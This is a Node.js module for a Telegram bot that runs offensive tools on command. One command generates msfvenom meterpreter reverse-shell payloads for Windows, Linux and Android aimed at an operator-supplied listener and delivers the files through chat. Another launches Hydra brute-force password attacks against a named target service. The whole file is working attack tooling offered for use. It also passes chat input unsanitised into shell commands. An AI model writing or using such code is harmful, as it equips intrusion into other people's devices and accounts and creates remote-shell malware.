const { runSystemCommand } = require('../utils/exec');
const { exec } = require('child_process');
const fs = require('fs');

module.exports = (bot, config) => {

    // /payload <os> <lhost> <lport>
    bot.command('payload', async (ctx) => {
        if (ctx.from.id !== config.OWNER_ID) return;
        
        if (!ctx.payload) return ctx.reply('Usage: /payload <os> <lhost> <lport>');
        const args = ctx.payload.split(' ');
        if (args.length < 3) return ctx.reply('Usage: /payload <os> <lhost> <lport>\nSupported OS: windows, linux, android');
        
        const [os, lhost, lport] = args;
        let cmd = '';
        let file = '';
        
        switch(os.toLowerCase()) {
            case 'windows':
                file = `payload_${Date.now()}.exe`;
                cmd = `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f exe -o ${file}`;
                break;
            case 'linux':
                file = `payload_${Date.now()}.elf`;
                cmd = `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f elf -o ${file}`;
                break;
            case 'android':
                file = `payload_${Date.now()}.apk`;
                cmd = `msfvenom -p android/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} R > ${file}`;
                break;
            default:
                return ctx.reply('❌ Unknown OS. Supported: windows, linux, android');
        }
        
        await ctx.reply(`⚙️ Manufacturing ${os} warhead (${lhost}:${lport})...`);
        
        exec(cmd, (err, stdout, stderr) => {
            if (err) {
                return ctx.reply(`❌ Generation failed. Is msfvenom installed?\nError: ${stderr || err.message}`);
            }
            
            // Upload the file
            ctx.replyWithDocument({ source: file, filename: file })
                .then(() => {
                    // Clean up
                    fs.unlink(file, () => {});
                    ctx.reply('✅ Payload delivered. Happy hunting.');
                })
                .catch((e) => ctx.reply(`❌ Upload failed: ${e.message}`));
        });
    });

    // /crack <service> <target> <user> <wordlist>
    bot.command('crack', (ctx) => {
        if (ctx.from.id !== config.OWNER_ID) return;
        
        if (!ctx.payload) return ctx.reply('Usage: /crack <service> <target> <user> <wordlist>');
        const args = ctx.payload.split(' ');
        if (args.length < 4) return ctx.reply('Usage: /crack <service> <target> <user> <wordlist>');
        
        const [service, target, user, wordlist] = args;
        
        // Construct Hydra Command
        // -I: Ignore existing restore file
        // -t 4: 4 tasks
        const cmd = `hydra -l ${user} -P ${wordlist} ${service}://${target} -I -t 4`;
        
        runSystemCommand(ctx, cmd, `Brute Force Attack (${service}) on ${target}`);
    });
};